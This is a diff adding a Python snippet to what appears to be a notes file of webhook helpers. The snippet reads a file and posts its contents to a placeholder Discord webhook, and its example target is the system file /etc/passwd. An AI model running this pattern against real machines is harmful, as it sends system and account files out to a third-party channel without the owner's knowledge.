@@ -167,3 +167,42 @@ slackPost   = {
 
 postSlackPost(webhook, slackPost)
 ```
+
+---
+
+#### Uploading of (text) files in Discord channel through webhooks
+
+```python3
+"""
+Python3 snippet allowing uploading of (text) files in discord server's
+channel through webhook
+"""
+
+import os 
+import requests
+import datetime
+
+def postFileOnDiscord(webhook, fileName):
+	with open(fileName, 'r') as f: fileContents = f.read().strip()
+
+	discordText	= {"content": fileContents}
+	response	= requests.post(webhook, json = discordText)
+
+	if response.status_code == 204:
+		print(f"[#] File {fileName} posted in channel!")
+
+	else:
+		print(f"[!] There was a issue uploading {fileName} in the channel!\nTrace:\n")
+		print(response.status_code)
+		print(response.headers)
+		print(response.text)
+
+def main():
+	webhook 	= "https://discordapp.com/api/webhooks/xxxxxxxxxxxxxxx/xxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+	fileName 	= "/etc/passwd"
+
+	postFileOnDiscord(webhook, fileName)
+
+if __name__ == '__main__':
+	main()
+```
